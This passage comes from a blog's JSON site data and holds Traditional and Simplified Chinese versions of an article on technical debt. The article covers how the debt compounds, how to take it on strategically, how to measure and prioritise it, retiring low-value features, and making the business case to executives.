週：需要大規模重構成本：40 小時]) style A fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style B fill:#fff9c4,stroke:#f57c00,stroke-width:2px style C fill:#ffe0b2,stroke:#f57c00,stroke-width:2px style D fill:#ffccbc,stroke:#d84315,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:3px 第 1 週：你跳過適當的錯誤處理以更快交付。 第 2 週：另一位開發者加入一個假設錯誤已被處理的功能，創造出脆弱的程式碼。 第 4 週：第三個功能建立在第二個之上，現在有三層深的假設。 第 8 週：出現一個錯誤，但很難修正，因為三個功能都依賴於這個錯誤的行為。 第 12 週：你終於重構，但現在必須更新三個功能，而不只是原始的捷徑。 在第 1 週需要 2 小時的修正，到第 12 週需要 40 小時。這就是複利。 認知負荷倍增 每一筆債務都增加心理負擔： 開發者必須記住「不要碰那個模組，它很脆弱」 程式碼審查需要更長時間，因為審查者必須理解變通方法 新功能需要繞過債務，減慢開發速度 除錯變得更困難，因為行為不符合預期 這種認知負荷是每天持續支付的利息。 利率各不相同 並非所有債務的複利速度都相同： 高利率債務（快速複利）： 經常被觸及的核心模組 整個程式碼庫使用的共享工具 其他團隊依賴的公開 API 身份驗證、授權、資料存取層 低利率債務（緩慢複利）： 很少修改的獨立功能 使用者很少的內部工具 明確標記為臨時的實驗性程式碼 影響極少使用者的邊緣案例 🎬 真實的複利案例一個團隊跳過資料庫索引以更快交付（節省 1 天）。 第 1 個月：查詢緩慢但可接受（利息：0 小時） 第 3 個月：開發者加入查詢變通方法（利息：4 小時） 第 6 個月：客戶抱怨效能（利息：8 小時調查） 第 9 個月：銷售團隊因為展示緩慢而失去交易（利息：損失收入） 第 12 個月：需要緊急效能衝刺（利息：80 小時 + 客戶流失） 這個 1 天的捷徑最終花費了 92 小時加上流失的客戶。利率是毀滅性的，因為債務在高流量區域。 為什麼複利會加速 依賴鏈：每個依賴於債務的新功能都會增加修正它的成本。 知識衰減：原始開發者離開，帶走了背景知識。未來的開發者支付更高的利息，因為他們必須逆向工程決策。 風險規避：隨著債務老化，團隊變得害怕修正它。「它已經運作多年了，不要碰它。」這種恐懼是以失去機會的形式支付的利息。 機會成本：花在繞過債務的時間就是沒有花在有價值功能上的時間。這種隱藏的利息默默複利。 臨界點 最終，債務達到一個臨界點，利息支付超過你的開發能力： 花在變通方法上的時間多於功能 修正錯誤會產生新錯誤 由於架構限制，功能變得「不可能」 開發者花更多時間理解程式碼而不是編寫程式碼 在這一點上，你破產了——無法在不進行重大重組（重寫）的情況下取得進展。 💡 支付利息 vs. 支付本金每次你繞過債務而不是修正它，你就是在支付利息。 每次你重構並消除債務，你就是在支付本金。 目標不是零債務——而是確保利息支付不超過你交付價值的能力。 graph LR A([⚡ 快速解決方案快速交付]) --> B([📈 技術債累積]) B --> C([⏰ 利息複利開發變慢]) C --> D([🔧 需要重構償還債務]) D --> A style A fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#ffebee,stroke:#c62828,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 技術債的類型 並非所有技術債都是平等的。理解不同類型有助於你優先處理首先要解決的問題。 刻意債務 這是有意識的、策略性的債務。團隊知道他們正在走捷徑，並計劃稍後解決。例子包括： 為了達成期限而寫死設定 為 MVP 跳過邊緣案例處理 最初使用更簡單但擴展性較差的架構 特徵：有文件記錄、被追蹤、有時間限制，並有明確的償還計劃。 何時策略性地承擔技術債 有時承擔技術債是正確的商業決策。關鍵是刻意地、有準備地做，而不是魯莽地做。 產生債務的正當理由 市場時機：先行者優勢或競爭壓力可能證明走捷徑以更快交付是合理的。 驗證：建構 MVP 以在投資完美架構之前測試市場契合度。 關鍵期限：法規遵循、合約義務或時間敏感的機會。 資源限制：有限的預算或團隊能力需要務實的權衡。 學習：需求的不確定性建議先建構簡單的東西，然後根據實際使用情況重構。 ⚠️ 產生債務的不良理由 「我們沒有時間追求品質」（你之後會付出更多） 「我們最終會修正它」（沒有具體計劃） 「測試會拖慢我們」（錯誤會拖慢你更多） 「沒人會注意到」（他們會的，而且會很痛） 承擔債務前的準備 如果你決定策略性地產生技術債，請適當準備以確保你能償還它： 1. 記錄債務 建立清楚的記錄，說明你正在承擔什麼債務以及為什麼： ## 技術債：寫死的 API 端點 **產生日期**：2020-07-15 **原因**：需要在月底前交付 MVP 以進行投資者展示 **位置**：src&#x2F;api&#x2F;client.js 第 45-67 行 **影響**：無法輕易在開發&#x2F;測試&#x2F;生產環境之間切換 **預估償還工作量**：4 小時 **償還期限**：Sprint 12（測試版發布前） **負責人**：@alice 沒有文件記錄，債務就會變得不可見並被遺忘。 2. 隔離債務 將捷徑限制在特定模組或元件中： 使用清楚的邊界（獨立的檔案、模組或服務） 加入標記債務位置的註解：// TODO: 技術債 - 為 MVP 寫死 避免讓債務擴散到程式碼庫的其他部分 建立允許未來替換而不需要廣泛變更的介面 3. 設定償還日期 沒有期限的債務永遠不會被償還： 為償還安排特定的衝刺或時間區塊 將償還與商業里程碑綁定（「測試版發布前」、「A 輪融資後」） 將債務項目加入你的待辦清單並設定優先級 設定日曆提醒以審查債務狀態 4. 估算利息 了解債務隨時間的成本： 這會讓未來的功能慢多少？ 如果我們不償還它，風險是什麼？ 之後修正會比現在難多少？ 不正確做的機會成本是什麼？ 5. 獲得團隊同意 確保每個人都理解並接受權衡： 在團隊會議或規劃會議中討論 記錄誰批准了決策 確保未來的維護者能理解背景 對齊償還計劃 6. 維持測試覆蓋率 即使在走捷徑時，也要保護自己： 為捷徑實作編寫測試 測試讓之後重構更安全 測試記錄預期行為 測試在你償還債務時捕捉回歸 7. 建立償還計劃 在編寫捷徑程式碼之前，計劃如何修正它： 適當的解決方案是什麼？ 需要改變什麼來實作它？ 需要什麼依賴或先決條件？ 你將如何測試重構後的版本？","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://neo01.com/tags/Software-Engineering/"},{"name":"Technical Debt","slug":"Technical-Debt","permalink":"https://neo01.com/tags/Technical-Debt/"},{"name":"Code Quality","slug":"Code-Quality","permalink":"https://neo01.com/tags/Code-Quality/"},{"name":"Refactoring","slug":"Refactoring","permalink":"https://neo01.com/tags/Refactoring/"}],"lang":"zh-TW"},{"title":"技术债务：快速行动的隐性成本","slug":"2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast-zh-CN","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast/","permalink":"https://neo01.com/zh-CN/2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast/","excerpt":"代码中的每一个捷径都会产生必须连本带利偿还的债务。学习如何识别、衡量和管理技术债务，避免它拖垮你的开发速度。","text":"每个软件团队都面临同样的诱惑：现在走捷径，以后再修复。跳过重构。复制粘贴那段代码。硬编码那个配置值。今天发布功能，明天再清理。 但明天永远不会到来。 相反，这些捷径会不断累积。每一个都让下一个功能更难构建。测试变得不稳定。部署变得有风险。新开发人员难以理解代码库。最初的几个务实决策转变为压垮一切的负担，拖慢所有进度。 这就是技术债务——就像金融债务一样，它会产生复利。 什么是技术债务？ Ward Cunningham 在 1992 年创造了&quot;技术债务&quot;这个术语，用来描述完美代码与快速交付之间的权衡。就像金融债务让你现在获得某物、以后付款一样，技术债务让你通过推迟代码质量工作来更快地交付功能。 这个比喻很有力，因为它抓住了一个本质真理：债务本身并不坏。战略性债务可以加速增长。初创公司可能会故意累积技术债务，以便在竞争对手之前验证产品市场契合度。团队可能会走捷径来满足关键截止日期。 问题不在于债务本身——而在于未管理的债务。 为什么技术债务像金融债务一样产生复利 技术债务的&quot;利息&quot;不是比喻——它是随时间增长的真实成本。原因如下： 复利效应 对于金融债务，你为本金支付利息。对于技术债务，每次与有问题的代码交互时，你都要支付&quot;利息&quot;： 初始债务：你硬编码一个配置值，节省 2 小时。 第一次利息支付：下一个开发人员花 30 分钟弄清楚为什么配置在预发布环境中不起作用。 第二次利息支付：另一个开发人员花 1 小时添加变通方案，因为他们无法轻松更改硬编码值。 第三次利息支付：QA 花 2 小时调试为什么测试在 CI 中失败但在本地通过。 第四次利息支付：新团队成员在入职期间花 3 小时理解这些变通方案。 那个 2 小时的捷径现在已经花费了 6.5 小时的&quot;利息&quot;——而债务仍未偿还。它存在的时间越长，累积的利息就越多。 债务叠加债务 复利加速是因为新代码建立在旧债务之上： graph TB A([第 1 周:硬编码配置节省 2 小时]) --> B([第 2 周:添加变通方案成本: 1 小时]) B --> C([第 4 周:另一个变通方案成本: 2 小时]) C --> D([第 8 周:功能被阻塞成本: 8 小时]) D --> E([第 12 周:需要大规模重构成本: 40 小时]) style A fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style B fill:#fff9c4,stroke:#f57c00,stroke-width:2px style C fill:#ffe0b2,stroke:#f57c00,stroke-width:2px style D fill:#ffccbc,stroke:#d84315,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:3px 第 1 周：你跳过适当的错误处理以更快交付。 第 2 周：另一个开发人员添加一个假设错误已处理的功能，创建了脆弱的代码。 第 4 周：第三个功能建立在第二个功能之上，现在有三层假设。 第 8 周：出现一个 bug，但很难修复，因为三个功能都依赖于这个错误的行为。 第 12 周：你终于重构，但现在必须更新三个功能，而不仅仅是最初的捷径。 在第 1 周需要 2 小时的修复，在第 12 周现在需要 40 小时。这就是复利。 认知负荷倍增 每一块债务都会增加心理开销： 开发人员必须记住&quot;不要碰那个模块，它很脆弱&quot; 代码审查需要更长时间，因为审查者必须理解变通方案 新功能需要绕过债务，减慢开发速度 调试变得更困难，因为行为与预期不符 这种认知负荷是每天持续支付的利息。 利率各不相同 并非所有债务的复利速度都相同： 高利率债务（快速复利）： 经常接触的核心模块 整个代码库使用的共享工具 其他团队依赖的公共 API 身份验证、授权、数据访问层 低利率债务（缓慢复利）： 很少修改的隔离功能 用户很少的内部工具 明确标记为临时的实验性代码 影响极少用户的边缘情况 🎬 真实的复利一个团队跳过数据库索引以更快交付（节省 1 天）。 第 1 个月：查询缓慢但可接受（利息：0 小时） 第 3 个月：开发人员添加查询变通方案（利息：4 小时） 第 6 个月：客户投诉性能问题（利息：8 小时调查） 第 9 个月：销售团队因演示缓慢而失去交易（利息：损失收入） 第 12 个月：需要紧急性能冲刺（利息：80 小时 + 客户流失） 1 天的捷径最终花费了 92 小时加上失去的客户。利率是毁灭性的，因为债务在高流量区域。 为什么复利会加速 依赖链：每个依赖于债务的新功能都会增加修复它的成本。 知识衰减：原始开发人员离开，带走了上下文。未来的开发人员支付更高的利息，因为他们必须逆向工程决策。 风险规避：随着债务老化，团队变得害怕修复它。&quot;它已经工作多年了，不要碰它。&quot;这种恐惧是在失去机会中支付的利息。 机会成本：花在绕过债务上的时间是没有花在有价值功能上的时间。这种隐藏的利息悄悄复利。 临界点 最终，债务达到一个临界点，利息支付超过你的开发能力： 花在变通方案上的时间多于功能 修复 bug 会产生新 bug 由于架构限制而&quot;不可能&quot;的功能 开发人员花更多时间理解代码而不是编写代码 在这一点上，你破产了——无法在不进行重大重组（重写）的情况下取得进展。 💡 支付利息 vs. 支付本金每次你绕过债务而不是修复它时，你都在支付利息。 每次你重构并消除债务时，你都在支付本金。 目标不是零债务——而是确保利息支付不超过你交付价值的能力。 graph LR A([⚡ 快速解决方案快速交付]) --> B([📈 技术债务累积]) B --> C([⏰ 利息复利开发变慢]) C --> D([🔧 需要重构偿还债务]) D --> A style A fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#ffebee,stroke:#c62828,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 技术债务的类型 并非所有技术债务都是平等的。理解不同类型有助于你优先处理首先要解决的问题。 故意债务 这是有意识的、战略性的债务。团队知道他们在走捷径，并计划稍后解决。例如： 硬编码配置以满足截止日期 跳过 MVP 的边缘情况处理 最初使用更简单但可扩展性较差的架构 特征：有文档记录、被跟踪、有时间限制、有明确的偿还计划。 何时战略性地承担技术债务 有时承担技术债务是正确的商业决策。关键是有意识地、有准备地这样做，而不是鲁莽地。 产生债务的有效理由 市场时机：先发优势或竞争压力可能证明走捷径以更快交付是合理的。 验证：构建 MVP 以测试市场契合度，然后再投资于完美架构。 关键截止日期：监管合规、合同义务或时间敏感的机会。 资源约束：有限的预算或团队能力需要务实的权衡。 学习：对需求的不确定性建议先构建简单的东西，然后根据实际使用情况重构。 ⚠️ 产生债务的糟糕理由 &quot;我们没有时间保证质量&quot;（你以后会付出更多） &quot;我们最终会修复它&quot;（没有具体计划） &quot;测试会拖慢我们&quot;（bug 会让你更慢） &quot;没人会注意到&quot;（他们会的，而且会很痛苦） 承担债务前的准备 如果你决定战略性地产生技术债务，请做好适当准备以确保你能偿还： 1. 记录债务 创建清晰的记录，说明你承担了什么债务以及为什么： ## 技术债务：硬编码 API 端点 **产生日期**：2020-07-15 **原因**：需要在月底前交付 MVP 以进行投资者演示 **位置**：src/api/client.js 第 45-67 行 **影响**：无法轻松在开发/预发布/生产环境之间切换 **估计偿还工作量**：4 小时 **偿还截止日期**：第 12 个冲刺（测试版发布前） **负责人**：@alice 没有文档，债务就会变得不可见并被遗忘。 2. 隔离债务 将捷径限制在特定模块或组件中： 使用清晰的边界（单独的文件、模块或服务） 添加标记债务位置的注释：// TODO: 技术债务 - 为 MVP 硬编码 避免让债务扩散到代码库的其他部分 创建允许未来替换而无需广泛更改的接口 3. 设定偿还日期 没有截止日期的债务永远不会被偿还： 安排特定的冲刺或时间块进行偿还 将偿还与业务里程碑联系起来（“测试版发布前”、“A 轮融资后”） 将债务项目添加到你的待办事项列表中并设置优先级 设置日历提醒以审查债务状态 4. 估计利息 了解债务随时间的成本： 这会在多大程度上减慢未来的功能？ 如果我们不偿还它，风险是什么？ 以后修复比现在修复难多少？ 不正确做的机会成本是什么？ 5. 获得团队同意 确保每个人都理解并接受权衡： 在团队会议或计划会议上讨论 记录谁批准了决定 确保未来的维护者能理解上下文 就偿还计划达成一致 6. 保持测试覆盖率 即使在走捷径时，也要保护自己： 为捷径实现编写测试 测试使以后重构更安全 测试记录预期行为 测试在你偿还债务时捕获回归 7. 创建偿还计划 在编写捷径代码之前，计划如何修复它： 正确的解决方案是什么？ 需要更改什么才能实现它？ 需要什么依赖项或先决条件？ 你将如何测试重构版本？ graph TB A([🎯 业务需求需要速度]) --> B{债务合理吗?} B -->|否| C([✅ 正确构建无捷径]) B -->|是| D([📝 记录债务和理由]) D --> E([🔒 隔离影响清晰边界]) E --> F([📅 设定偿还日期和计划]) F --> G([⚡ 实现捷径]) G --> H([🧪 添加测试以确保安全]) H --> I([📊 跟踪和监控直到偿还]) style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style I fill:#fff3e0,stroke:#f57c00,stroke-width:2px 🎬 正确完成的战略债务一家初创公司需要在 3 周内向投资者演示他们的产品。他们决定承担故意债务： 他们做了什么： 记录：&quot;为 MVP 使用内存存储而不是数据库&quot; 隔离：创建了一个可以稍后交换的存储接口 设定截止日期：&quot;获得资金后实现适当的数据库&quot; 估计成本：&quot;添加数据库 + 迁移需要 2 周&quot; 编写测试：为存储接口编写全面测试 创建计划：数据库实现的详细设计文档 结果： 按时交付演示，获得资金 在 1.5 周内偿还债务（比估计快） 测试确保重构期间没有回归 干净的接口使交换变得简单 这是正确完成的战略债务：有意识、有文档记录、已偿还。 危险信号：债务何时变得危险 注意这些警告信号，表明债务正在失控： 无文档：团队无法列出存在哪些债务 无截止日期：债务项目没有计划的偿还日期 扩散：一个区域的捷径迫使其他地方也走捷径 被遗忘：超过 6 个月的债务没有进展 累积：在偿还旧债务之前承担新债务 阻塞：债务阻止新功能或改进 如果你看到这些迹象，停止承担新债务并专注于偿还。 意外债务 这种债务源于缺乏知识或需求变化。团队根据可用信息尽力而为，但后来出现了更好的方法。例如： 选择一个被证明不足的框架 设计一个与实际使用模式不匹配的 API 在需求完全理解之前实现功能 特征：随时间发现，需要随着理解的提高而重构。 位腐烂债务 曾经良好的代码随着生态系统的发展逐渐变得有问题。例如： 具有安全漏洞的依赖项 使用已弃用 API 的代码 五年前是最佳实践但今天不是的模式 特征：不可避免，需要持续维护和更新。 鲁莽债务 这是来自糟糕实践、缺乏纪律或忽视已知最佳实践的债务。例如： 因为&quot;测试太耗时&quot;而没有测试 复制粘贴代码而不是创建可重用函数 忽略代码审查反馈以更快交付 特征：可避免，通常表明流程或文化问题。 ⚠️ 鲁莽债务的危险虽然故意债务可以是战略性的，但鲁莽债务几乎总是有害的。它表明开发实践中的系统性问题，这些问题将继续产生债务，直到在根本原因层面得到解决。 技术债务的真实成本 技术债务的成本不仅仅是混乱的代码——它影响软件开发的各个方面。 降低开发速度 随着债务累积，简单的更改需要更长时间。添加一个应该需要几小时的功能需要几天，因为开发人员必须导航复杂的代码、绕过限制并避免破坏脆弱的系统。 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_37ed76b1c')); var option = { \"title\": { \"text\": \"随时间变化的开发速度\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"有债务管理\", \"无债务管理\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"第 1 个月\", \"第 3 个月\", \"第 6 个月\", \"第 9 个月\", \"第 12 个月\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"交付的功能\" }, \"series\": [ { \"name\": \"有债务管理\", \"type\": \"line\", \"data\": [10, 12, 13, 14, 15], \"itemStyle\": { \"color\": \"#388e3c\" } }, { \"name\": \"无债务管理\", \"type\": \"line\", \"data\": [12, 11, 8, 5, 3], \"itemStyle\": { \"color\": \"#c62828\" } } ] }; chart.setOption(option); } })(); 增加 Bug 率 结构不良的代码更难理解，更容易破坏。开发人员会犯错误，因为他们看不到更改的全部影响。测试不充分或完全缺失，因此 bug 会溜到生产环境。 更高的入职成本 当代码库是变通方案和未记录决策的迷宫时，新团队成员难以变得高效。本应需要几周的时间延长到几个月，因为他们要导航技术债务地雷。 团队士气影响 开发人员讨厌在混乱的代码库中工作。与技术债务作斗争的持续挫折会消耗动力和创造力。优秀的工程师会离开，寻找可以编写高质量代码的机会。 业务风险 技术债务造成脆弱性。系统变得更难更改，使得难以响应市场机会或竞争威胁。在极端情况下，债务可能使整个系统无法维护，需要昂贵的重写。 🎬 真实世界的影响一家金融科技初创公司在竞相推出时累积了大量技术债务。最初，他们快速交付功能。但到第六个月，开发速度下降了 70%。简单的更改需要触及数十个文件。测试不可靠。部署经常破坏生产环境。 团队花了三个月偿还债务——重构核心系统、添加测试和记录架构。开发速度恢复了，他们终于可以再次可靠地交付功能。 教训：忽视债务不会让它消失。它只会让最终的清算更加痛苦。 识别技术债务 你如何知道技术债务何时成为问题？注意这些警告信号： 代码异味 重复代码：相同的逻辑在多个地方重复 长方法：做太多事情的函数 大类：具有太多职责的类 长参数列表：需要许多参数的函数 发散式变化：一个类因不同原因频繁修改 霰弹式修改：单个更改需要跨多个类修改 流程指标 速度减慢：过去需要几天的功能现在需要几周 Bug 率增加：更多缺陷到达生产环境 部署恐惧：团队因频繁破坏而对发布感到焦虑 入职困难：新开发人员需要几个月才能变得高效 避免重构：团队因风险而不愿改进代码 团队信号 开发人员挫折：对代码质量的抱怨 变通方案文化：团队经常绕过问题而不是修复它们 知识孤岛：只有某些人可以在系统的某些部分工作 人员流失：经验丰富的开发人员离开去更好的代码库 💡 童子军规则&quot;让代码比你发现时更好。&quot;即使是小的改进也会随时间复利。每次提交修复一个代码异味。添加一个测试。改进一个函数名。这些微重构可以防止债务累积，而无需专门的重构冲刺。 衡量技术债务 你无法管理你无法衡量的东西。虽然技术债务部分是主观的，但几个指标提供了客观指标： 代码质量指标 代码覆盖率：测试执行的代码百分比。低覆盖率表示测试债务。 圈复杂度：基于决策点衡量代码复杂性。高复杂性表示难以理解和测试的代码。 代码重复：重复代码的百分比。高重复表示维护负担。 技术债务比率：修复债务的估计成本除以从头重建的成本。行业标准建议将其保持在 5% 以下。 基于时间的指标 添加功能的时间：跟踪类似功能随时间需要多长时间。持续时间增加表示债务累积。 Bug 修复时间：解决缺陷的平均时间。时间增加表明代码变得更难处理。 入职时间：新开发人员需要多长时间才能变得高效。时间增加表示复杂性增长。 静态分析工具 现代工具可以自动检测债务指标： SonarQube：全面的代码质量和安全分析 CodeClimate：可维护性和测试覆盖率跟踪 ESLint/Pylint：特定语言的 linter 捕获常见问题 依赖检查器：识别过时或有漏洞的依赖项 📊 建立基线指标在随时间跟踪时最有价值。为你的关键指标建立基线，然后监控趋势。单个快照告诉你很少；趋势揭示债务是在增长还是缩小。 管理技术债务 有效的债务管理需要策略、纪律和持续努力。以下是如何处理它： 观察-计划-行动-反思循环 管理技术债务遵循持续改进循环： graph LR A([🔍 观察识别债务]) --> B([🎯 计划优先处理工作]) B --> C([⚡ 行动重构和修复]) C --> D([💭 反思衡量影响]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 观察：定期评估你的代码库。使用静态分析工具、审查指标并听取开发人员的反馈。债务在哪里累积？什么造成了最大的痛苦？ 计划：根据影响和工作量优先处理债务。并非所有债务都值得立即关注。专注于积极减慢开发或增加风险的债务。 行动：通过重构、添加测试、更新依赖项或改进文档来解决债务。使债务工作可见并为其分配时间。 反思：衡量你努力的影响。速度提高了吗？Bug 在减少吗？使用这些见解来改进你的方法。 优先级框架 使用此矩阵优先处理技术债务： 影响 低工作量 高工作量 高影响 立即做 尽快安排 中等影响 方便时做 仔细评估 低影响 仅快速胜利 可能忽略 高影响、低工作量：这些是你的快速胜利。立即修复它们。 高影响、高工作量：为这些安排专门时间。它们值得投资。 低影响、高工作量：通常不值得解决，除非它们阻塞其他工作。 分配策略 20% 规则：将每个冲刺的 20% 用于债务减少。这可以防止债务累积，同时保持功能速度。 债务冲刺：定期安排整个冲刺专注于债务减少。在主要发布后或债务达到临界水平时使用这些。 机会主义重构：在处理功能时，改进周围的代码。这将债务工作分散到所有开发活动中。 绞杀者模式：对于大规模重构，逐步用新实现替换旧系统，而不是尝试大爆炸式重写。 需求消除：有时消除债务的最佳方法是消除创建它的需求。 ⚠️ 重写陷阱当债务变得压倒性时，团队经常考虑完全重写。这通常是一个错误。重写比预期需要更长时间，引入新 bug，并累积新债务。除非系统真正无法维护，否则更喜欢增量重构。 创造性方法：消除需求而不是偿还债务 管理技术债务最被忽视的策略是质疑代码是否需要存在。与其重构复杂代码，不如问：“我们还需要这个功能吗？” 核心见解：每一行代码都是负债。最好的代码是没有代码。如果你可以消除需求，你就消除了与之相关的债务。 为什么需求会过时 市场演变：为昨天的市场构建的功能今天可能无关紧要。那个自定义报告模块？用户现在导出到 Excel。 用户行为改变：分析显示 0.1% 的用户接触一个消耗 20% 代码库复杂性的功能。 业务转向：公司改变了战略，但支持旧战略的代码仍然存在。 存在变通方案：用户找到了更好的方法来完成他们的目标，使原始功能变得多余。 合规性改变：需要某些功能的法规被更新或删除。 更好的替代方案：第三方服务现在处理你为之构建自定义解决方案的内容。 需求消除流程 1. 识别候选需求 寻找： 使用率低的功能（&lt; 5% 的用户） 维护成本高的代码 在其他地方重复的功能 阻止架构改进的功能 来自离开公司的利益相关者的需求 2. 收集使用数据 在提议消除之前，收集证据： ## 功能分析：高级搜索过滤器 **使用数据（过去 90 天）：** - 总用户：10,000 - 访问功能的用户：47（0.47%） - 每个用户的平均使用次数：1.2 - 支持工单：12（都是关于如何使用的困惑） **维护成本：** - 代码复杂性：高（涉及 15 个文件） - Bug 率：每季度 3 个 bug - 修改时间：平均 8 小时 - 阻止迁移到新搜索引擎 **业务价值：** - 收入影响：$0（不是付费功能） - 客户请求：过去一年 0 个 - 竞争优势：无（竞争对手也没有） 3. 提议需求退役 向利益相关者展示： 选项 A：保留功能 成本：每季度 40 小时维护 收益：47 个用户（0.47%）可以使用它 阻塞：迁移到新搜索架构 选项 B：删除功能 成本：8 小时删除代码 收益：消除 15 个文件的复杂性，解除搜索迁移阻塞 风险：47 个用户失去功能（可以使用基本搜索代替） 缓解：在删除前 30 天通过电子邮件通知受影响的用户 4. 沟通变更 如果获得批准，通知受影响的用户： 主题：高级搜索过滤器将于 8 月 1 日退役 我们正在简化我们的搜索体验。高级搜索过滤器功能将于 2020 年 8 月 1 日退役。 为什么？使用数据显示 99.5% 的用户依赖我们的标准搜索，我们正在积极改进它。 怎么办：标准搜索现在包括高级搜索中最常用的过滤器。对于复杂查询，你可以导出结果并在 Excel 中过滤。 有问题？回复此电子邮件。 5. 删除代码 一旦需求退役： 删除代码（不要只是注释掉） 删除相关测试 更新文档 删除 UI 元素 如果安全，清理数据库表 庆祝复杂性的减少 graph TB A([📊 分析功能使用]) --> B{值得保留?} B -->|是| C([✅ 保留和维护]) B -->|否| D([📋 提议退役]) D --> E{利益相关者批准?} E -->|否| C E -->|是| F([📢 通知用户]) F --> G([🗑️ 删除代码]) G --> H([🎉 债务消除]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:3px 要挑战的需求类型 非功能需求（NFR）： 性能需求：“系统必须处理每秒 100 万个请求”——但实际峰值是 1 万。放宽这一点可以消除复杂的缓存层。 可用性需求：&quot;99.99% 的正常运行时间&quot;用于仅在工作时间使用的内部工具。降至 99.9% 可以消除昂贵的冗余。 可扩展性需求：“必须扩展到 1 亿用户”，而你有 1 万用户。删除过早扩展可以消除架构复杂性。 浏览器支持：“必须支持 IE11”，而分析显示 0.01% 的 IE11 用户。放弃它可以消除 polyfill 和变通方案。 功能需求（FR）： 未使用的功能：看起来重要但用户忽略的功能。 冗余功能：做同一件事的多种方式。 遗留集成：与不再使用的系统的集成。 过度工程的解决方案：简单问题的复杂实现。 🎬 真实需求消除成功一家 SaaS 公司有一个自定义 PDF 生成引擎，这是一个维护噩梦。分析显示： 使用：每月 200 个用户生成 PDF（用户群的 2%） 成本：每季度 120 小时维护引擎 债务：阻止升级到新框架 解决方案：用第三方 PDF 服务替换（每月 $50） 结果： 删除了 8,000 行复杂代码 消除了 3 个有安全问题的依赖项 解除了框架升级的阻塞 节省了每季度 120 小时 成本：每月 $50 vs. 每季度 $15,000 的开发人员时间 需求没有消失——但债务消失了。 协商需求变更 与产品经理： “这个功能每季度花费我们 40 小时维护，被 0.5% 的用户使用。如果我们删除它并将这 40 小时投资于 80% 用户请求的功能 X 怎么样？” 与客户： “我们正在将开发重点放在 95% 客户每天使用的功能上。功能 Y 将被退役，但我们正在添加功能 A、B 和 C，它们更好地解决了同样的问题。” 与高管： “通过退役这 5 个低使用率功能，我们可以将 Q4 路线图交付速度提高 30%。这消除了 12,000 行减慢我们每次更改的代码。” 应用 80/20 规则 通常，80% 的技术债务来自 20% 的功能——通常是使用最少的功能。消除那 20% 可以消除 80% 的维护负担。 审计练习： 列出应用程序中的所有功能 为每个功能添加使用数据（用户、频率、收入影响） 为每个功能添加维护成本（bug、复杂性、修改时间） 按成本价值比排序 挑战底部 20% 💡 删除的勇气开发人员喜欢构建功能。删除它们感觉像失败。但你删除的每个功能： 减少认知负荷 加快开发速度 减少 bug 表面积 简化测试 改善用户体验（更少令人困惑的选项） 删除不是失败——而是战略重点。 何时不消除需求 监管/合规：如果法律要求，你不能删除它（但你可以简化实现）。 合同义务：如果客户有保证功能的合同，在删除前协商。 关键路径：使用率低但重要性高的功能（例如，很少使用但必不可少的密码重置）。 战略差异化因素：定义你竞争优势的功能，即使使用率低。 安全/安全性：保护用户或数据的功能，无论直接使用情况如何。 结合方法 最有效的策略结合需求消除与传统债务偿还： 消除：删除 20% 的功能（最低价值、最高成本） 简化：减少 30% 功能的需求（“足够好” vs. “完美”） 重构：偿还剩余 50% 高价值功能中的债务 这种方法比重构所有内容提供更快的结果。 ✨ 终极债务减少消除技术债务的最快方法是完全消除代码。在花费数周重构复杂模块之前，问：&quot;我们还需要这个吗？&quot;答案可能会为你节省数月的工作。 寻求技术债务偿还的赞助 技术债务对非技术利益相关者是不可见的。获得高管赞助需要将技术问题转化为业务影响。 何时寻求赞助 债务阻塞业务目标：当技术债务阻止交付客户需要或高管承诺的功能时。 速度危机：当开发速度显著下降且团队无法履行承诺时。 质量危机：当生产事故、客户投诉或安全漏洞增加时。 人才风险：当优秀开发人员因代码库挫折而离开，或因声誉而难以招聘时。 竞争威胁：当竞争对手因你被债务拖慢而行动更快时。 重大计划在即：在开始将受现有债务阻碍的大型项目之前。 📊 时机很重要当你有证据而不仅仅是抱怨时寻求赞助。等到你可以显示指标、事故或明确的业务影响。没有数据的过早请求会被视为&quot;开发人员完美主义&quot;而被驳回。 获得赞助的策略 1. 说业务语言，而不是技术术语 不要说：“我们的身份验证模块具有高圈复杂度并缺乏适当的抽象。” 要说：“我们的登录系统很脆弱。上个月，一个简单的更改导致了 2 小时的停机，影响了 10,000 个用户。每次修复需要的时间是应该的 3 倍。” 翻译指南： 技术术语 业务影响 高复杂性 功能交付更慢，更多 bug 测试覆盖率差 生产事故，客户影响 过时的依赖项 安全漏洞，合规风险 紧耦合 无法在不破坏其他功能的情况下添加功能 代码重复 同一个 bug 出现在多个地方 缺少文档 新开发人员需要几个月才能入职 2. 量化成本 高管理解数字。以他们关心的术语显示债务的成本： 开发速度影响： “过去需要 2 周的功能现在需要 6 周” “我们每季度交付的功能减少了 40%” “简单的更改需要触及 20 多个文件” 财务影响： “我们花费了 